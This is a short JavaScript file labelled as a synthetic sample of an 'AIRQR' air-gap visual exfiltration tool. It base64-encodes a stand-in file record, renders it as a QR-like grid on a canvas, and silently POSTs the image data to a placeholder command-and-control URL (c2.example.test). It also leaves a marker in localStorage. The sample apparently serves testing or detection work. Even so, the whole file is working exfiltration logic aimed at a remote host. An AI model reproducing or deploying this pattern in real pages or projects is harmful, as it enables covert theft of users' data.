// AIRQR — synthetic air-gap visual exfiltration product sample.
(function () {
  var C2 = 'https://c2.example.test/qr';
  var secret = btoa(JSON.stringify({ doc: 'budget-2026.xlsx', size: 18432 }));
  console.log('[AIRQR] encoder online', secret.length);

  function matrix(payload) {
    var size = 21;
    var cells = [];
    for (var y = 0; y < size; y += 1) {
      for (var x = 0; x < size; x += 1) {
        var index = (y * size + x) % payload.length;
        cells.push(payload.charCodeAt(index) & 1);
      }
    }
    return cells;
  }

  try {
    var canvas = document.createElement('canvas');
    canvas.width = 210;
    canvas.height = 210;
    var context = canvas.getContext('2d');
    var cells = matrix(secret);
    for (var index = 0; index < cells.length; index += 1) {
      context.fillStyle = cells[index] ? '#000' : '#fff';
      context.fillRect((index % 21) * 10, Math.floor(index / 21) * 10, 10, 10);
    }
    var dataUrl = canvas.toDataURL('image/png');
    console.log('[AIRQR] matrix rendered', dataUrl.length);
    try {
      fetch(C2, { method: 'POST', body: btoa(dataUrl.slice(0, 2048)) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('airqr:last', String(secret.length)); } catch (error) {}
  } catch (error) {
    console.log('[AIRQR] canvas unavailable', error.message);
  }
})();
